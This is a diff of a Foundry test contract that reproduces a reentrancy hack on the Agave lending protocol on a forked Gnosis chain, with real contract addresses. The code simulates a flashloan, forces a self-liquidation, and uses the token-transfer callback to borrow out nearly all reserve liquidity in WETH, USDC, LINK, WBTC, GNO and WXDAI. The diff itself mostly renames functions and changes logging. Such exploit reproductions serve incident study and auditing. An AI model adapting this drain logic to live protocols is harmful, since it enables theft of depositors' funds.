@@ -60,6 +60,10 @@ contract AgaveExploit is Test {
     address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
     address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;
 
+    address provider = 0xA91B9095eFa6C0568467562032202108e49c9Ef8;
+    //Address that can mint tokens on gnosis bridge
+    address tokenOwner = 0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d;
+
     //Asset interfaces
     IGnosisBridgedAsset WETH = IGnosisBridgedAsset(weth);
     IGnosisBridgedAsset LINK = IGnosisBridgedAsset(link);
@@ -72,12 +76,12 @@ contract AgaveExploit is Test {
 
     function setUp() public {
         vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
-        providerAddrs = ILendingPoolAddressesProvider(0xA91B9095eFa6C0568467562032202108e49c9Ef8);
+        providerAddrs = ILendingPoolAddressesProvider(provider);
         lendingPool = ILendingPool(providerAddrs.getLendingPool());
         console.log(providerAddrs.getPriceOracle());
         //Lets just mint weth to this contract for initial debt
-        vm.startPrank(0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d);
-        wethLiqBeforeHack = getAvailableLiquidity(weth);
+        vm.startPrank(tokenOwner);
+        wethLiqBeforeHack = _getAvailableLiquidity(weth);
         //Mint initial weth funding
         WETH.mint(address(this), 2728.934387414251504146 ether);
         WETH.mint(address(this), 1);
@@ -90,17 +94,17 @@ contract AgaveExploit is Test {
         WETH.approve(address(lendingPool), type(uint256).max);
     }
 
-    function getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
+    function _getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
         DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
         reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
     }
 
-    function getHealthFactor() public view returns (uint256) {
+    function _getHealthFactor() internal view returns (uint256) {
         (,,,,, uint256 healthFactor) = lendingPool.getUserAccountData(address(this));
         return healthFactor;
     }
 
-    function prepare() public {
+    function _initHF() internal {
         //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc
 
         uint256 balance = LINK.balanceOf(address(this));
@@ -129,35 +133,35 @@ contract AgaveExploit is Test {
 
     function _logBalances(string memory message) internal {
         console.log(message);
-        console.log("--- Start of balances --- ");
-        console.log("WETH Balance %d", _logTokenBal(weth));
-        console.log("aWETH Balance %d", _logTokenBal(aweth));
-        console.log("USDC Balance %d", _logTokenBal(usdc));
-        console.log("GNO Balance %d", _logTokenBal(gno));
-        console.log("LINK Balance %d", _logTokenBal(link));
-        console.log("WBTC Balance %d", _logTokenBal(wbtc));
-        console.log("healthf : %d", getHealthFactor());
-        console.log("--- End of balances --- ");
+        console.log("--- Start of balances ---");
+        emit log_named_decimal_uint("WETH Balance", _logTokenBal(weth), 18);
+        emit log_named_decimal_uint("aWETH Balance", _logTokenBal(aweth), 18);
+        emit log_named_decimal_uint("USDC Balance", _logTokenBal(usdc), 6);
+        emit log_named_decimal_uint("GNO Balance", _logTokenBal(gno), 18);
+        emit log_named_decimal_uint("LINK Balance", _logTokenBal(link), 18);
+        emit log_named_decimal_uint("WBTC Balance", _logTokenBal(wbtc), 8);
+        emit log_named_decimal_uint("healthf", _getHealthFactor(), 18);
+        console.log("--- End of balances ---");
     }
 
     function testExploit() public {
         //Call prepare and get it setup
-        prepare();
+        _initHF();
         _logBalances("Before hack balances");
-        flashloanFundingWETH();
+        _flashWETH();
         _logBalances("After hack balances");
     }
 
-    function flashloanFundingWETH() internal {
-        this.uniswapV2Call(address(this), ethFlashloanAmt, 0, new bytes(0));
+    function _flashWETH() internal {
+        uniswapV2Call(address(this), ethFlashloanAmt, 0, abi.encode(msg.sender));
     }
 
-    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
+    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {
         //We simulate a flashloan from uniswap for initial eth funding
-        attackLogic(_amount0, _amount1, _data);
+        _attackLogic(_amount0, _amount1, _data);
     }
 
-    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
+    function _attackLogic(uint256 _amount0, uint256 _amount1, bytes memory _data) internal {
         //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
         vm.warp(block.timestamp + 1 hours);
         vm.roll(block.number + 1);
@@ -165,44 +169,34 @@ contract AgaveExploit is Test {
         lendingPool.liquidationCall(weth, weth, address(this), 2, false);
         //This will withdraw the funds from weth lending pool
         lendingPool.withdraw(weth, _logTokenBal(aweth), address(this));
-        //Calculation of flashloan fees for uniswap v2 pair,we just emulate it here for continuity purposes
-        uint256 amountRepay = ((ethFlashloanAmt * 1000) / 997) + 1;
-        require(amountRepay < WETH.balanceOf(address(this)), "not enough eth");
-        //For test case we just send it to address(1) to reduce the flashloan amount from us to get final assets
-        WETH.transfer(address(1), amountRepay);
+        //For test case we just send it to address(1) to reduce the flashloan debt amount from us to get final assets
+        WETH.transfer(address(1), ((ethFlashloanAmt * 1000) / 997) + 1);
     }
 
-    function depositWETH() internal {
-        lendingPool.deposit(weth, 1, address(this), 0);
-    }
-
-    function maxBorrow(address asset, bool maxxx) internal {
-        uint256 reserveTokenbal = getAvailableLiquidity(asset);
+    function _borrow(address asset) internal {
+        uint256 reserveTokenbal = _getAvailableLiquidity(asset);
         uint256 BorrowAmount = reserveTokenbal > 2 ? reserveTokenbal - 1 : 0;
-        if (BorrowAmount > 0) {
-            lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
-        }
+        if (BorrowAmount > 0) lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
     }
 
-    function borrowMaxtokens() internal {
+    function borrowTokens() internal {
         lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
-        maxBorrow(usdc, true);
-        maxBorrow(link, true);
-        maxBorrow(wbtc, true);
-        maxBorrow(gno, true);
-        maxBorrow(wxdai, true);
-        //We borrow directly here cause of some edge case the maxborrow fails for weth
+        _borrow(usdc);
+        _borrow(link);
+        _borrow(wbtc);
+        _borrow(gno);
+        _borrow(wxdai);
+        //We borrow directly here cause of some edge case the _borrow fails for weth
         lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
     }
 
     function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
-        console.log("tokencall From: %s, Value: %d", _from, _value);
         //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1
         if (_from == aweth && _value == 1) {
             callCount++;
         }
         if (callCount == 2 && _from == aweth && _value == 1) {
-            borrowMaxtokens();
+            borrowTokens();
         }
     }
 }
